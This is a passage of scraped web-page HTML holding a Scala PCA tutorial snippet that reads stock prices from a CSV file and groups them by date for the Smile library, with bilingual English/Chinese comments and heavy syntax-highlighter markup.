    //group all records by date, and sort the groups on date ascending
    //按日期将所有记录分组，并按日期将组升序排列
    val groupedByDate = data.groupBy(x =&amp;gt; x._1).toArray.sortBy(x =&amp;gt; x._1)
    //extract the values from the 3-tuple and turn them into
    // an array of tuples: Array[(Date, Array[Double)]
    //抽取这些3元组的值并将它们转换为一个元组数组：Array[(Date,Array[Double])]
    val dateArrayTuples = groupedByDate
        .map(x =&amp;gt; (x._1, x
                        ._2
                        .sortBy(x =&amp;gt; x._2)
                        .map(y =&amp;gt; y._3)
                    )
            )

    //turn the tuples into two separate arrays for easier use later on
    //将这些元组分隔为两个数组以方便之后使用
    val dateArray = dateArrayTuples.map(x =&amp;gt; x._1).toArray
    val doubleArray = dateArrayTuples.map(x =&amp;gt; x._2).toArray


    (dateArray,doubleArray)
  }

  def getStockDataFromString(dataString: String): (Date,String,Double) = {

    //Split the comma separated value string into an array of strings
    //把用逗号分隔的数值字符串分解为一个字符串数组
    val dataArray: Array[String] = dataString.split(&#39;,&#39;)

    val format = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;)
    //Extract the values from the strings
    //从字符串中抽取数值

    val date = format.parse(dataArray(0))
    val stock: String = dataArray(1)
    val close: Double = dataArray(2).toDouble

    //And return the result in a format that can later 
    //easily be used to feed to Smile
    //并以一定格式返回结果，使得该结果之后容易输入到Smile中处理

    (date,stock,close)
  }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b5478301554-67&quot;&gt;67&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;PCA&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-3&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;PCA Example&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get the example data&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//获取案例数据&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../Example Data/&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exampleDataPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;PCA_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStockDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exampleDataPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-11&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStockDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get all the records (minus the header)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//获取所有记录（减去标头）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStockDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-23&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//group all records by date, and sort the groups on date ascending&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//按日期将所有记录分组，并按日期将组升序排列&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;groupedByDate&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//extract the values from the 3-tuple and turn them into&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// an array of tuples: Array[(Date, Array[Double)]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//抽取这些3元组的值并将它们转换为一个元组数组：Array[(Date,Array[Double])]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-30&quot;&gt;
